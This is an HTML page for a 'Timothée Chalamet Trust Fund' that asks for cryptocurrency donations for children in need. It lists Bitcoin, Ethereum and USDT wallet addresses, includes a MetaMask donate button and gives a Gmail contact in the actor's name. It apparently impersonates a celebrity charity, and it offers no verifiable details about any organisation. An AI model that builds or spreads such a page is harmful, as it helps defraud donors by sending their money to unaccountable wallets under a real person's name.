
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Timothée Chalamet Trust Fund</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.5/web3.min.js"></script>
    <script defer src="script.js"></script>
</head>
<body>

    <header>
        <h1>Timothée Chalamet Trust Fund</h1>
        <p>Help make a difference in children's lives through cryptocurrency donations.</p>
    </header>

    <!-- Hero Section -->
    <section id="hero">
        <img src="timothee-helping-kids.jpg" alt="Timothée Chalamet Helping Kids">
        <h2>Donate & Make a Change</h2>
        <p>Your donations provide food, education, and shelter to children in need.</p>
        <a href="#donation" class="donate-btn">Donate Now</a>
    </section>

    <!-- Donation Section -->
    <section id="donation">
        <h2>Donate Cryptocurrency</h2>
        <p>Send your contributions to the following wallets:</p>
        <ul>
            <li><b>Bitcoin (BTC):</b> <span id="btc">bc1qsnagwy69geh2ndcm29gewgvz5cthl4lcaqt2aq</span> <button onclick="copyAddress('btc')">Copy</button></li>
            <li><b>Ethereum (ETH):</b> <span id="eth">0x5475eB9812285BFDE3d3FA6242A467A453A59a35</span> <button onclick="copyAddress('eth')">Copy</button></li>
            <li><b>USDT (ERC20):</b> <span id="usdt">0x5475eB9812285BFDE3d3FA6242A467A453A59a35</span> <button onclick="copyAddress('usdt')">Copy</button></li>
        </ul>
        <button onclick="donateCrypto()">Donate with MetaMask</button>
    </section>

    <!-- Contact Section -->
    <section id="contact">
        <h2>Contact Us</h2>
        <p>Email us at <a href="mailto:TimothéeChalamet@gmail.com">TimothéeChalamet@gmail.com</a></p>
    </section>

    <footer>
        <p>&copy; 2025 Timothée Chalamet Trust Fund. All rights reserved.</p>
    </footer>

</body>
</html>
